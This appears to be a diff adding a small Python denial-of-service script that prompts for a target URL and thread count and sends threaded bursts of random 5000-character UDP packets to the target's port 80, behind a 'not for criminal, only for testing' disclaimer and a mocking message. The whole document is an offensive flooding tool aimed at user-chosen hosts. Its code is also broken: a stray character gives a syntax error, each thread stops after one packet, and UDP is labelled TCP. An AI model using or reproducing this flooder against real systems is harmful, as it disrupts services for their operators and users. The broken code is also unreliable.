@@ -1,0 +1,78 @@
+# Denial Of Service attack
+#Created by Nobleex
+#==============================================================================================================================
+# ===================================>>>>>>>>>>>>>>>>>>>>Not For Criminal<<<<<<<<<<<<<<<<<<<<<<==================================
+# ==================================>>>>>>>>>>>>>>>>>>>>>Only for testing<<<<<<<<<<<<<<<<<<<<<==================================
+# ==================================>>>>>>>>>>>>>>We not RESPONSIBLE if anything happens<<<<<<<<<<<<<<===========================
+# Repository -->  
+
+
+title = '''
+                                                         ________
+      _ \       __ _ _|  |____   | |    | | __________ | |_______| |
+     |   | |   |______    ____|  | |____| ||         ||  |       | |
+     ___/  |   |      |  |       | _____  ||         |   |       | |
+    _|    \__, |      |  |_ _ _  ||     | ||         |   |       | |
+           ____/      |_____ _ | ||     |_||_________|   |       | |
+                                                                    
+ 
+'''
+
+version = "3.11"
+
+print('DOS Attack python')
+print('Only for version--> ' + version)
+
+# =====================================================================================================================================
+# ------------------------------------------------------------------------------------------------------------------------------------
+
+#First, Importing package
+
+import socket
+import time
+import sys
+import threading
+
+#Second, User Interface script
+
+print('Denial Of Service attack')
+
+print("\033[92mLoading..\033[00m\Done !!\n")
+time.sleep(3)
+
+
+address = input('URL Target:')
+count = int(input('Enter the count fo threads:'))
+ip = socket.gethostbyname(address)
+
+UDP_PORT = 80
+print("Your target's IP address:", ip)
+print("User Datagram Protocol (TCP) Port:", UDP_PORT)
+time.sleep(5)
+
+# Third, messagernd script
+def create_rnd_msg(msg_size):
+	import random
+
+	rnd_msg = ""
+	for i in range(0, msg_size):
+		ch_rnd = random.randint(0, 5000)
+		rnd_msg += chr(ch_rnd)
+	return rnd_msg
+
+# Fourth, dos message
+def dos():A
+	while True:	
+		MESSAGE = str.encode(create_rnd_msg(5000))
+		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+		sock.sendto(MESSAGE, (ip, UDP_PORT))
+		print(f'Packet Sent Successfuly => Message: \033[94m {MESSAGE.decode()} "\033[00m HAHAHHAHA MAKANYA JANGAN KEMAKIIIIIIII')
+		break
+
+for i in range(count):
+		threading.Thread(target=dos).start()
+
+
+
+
+
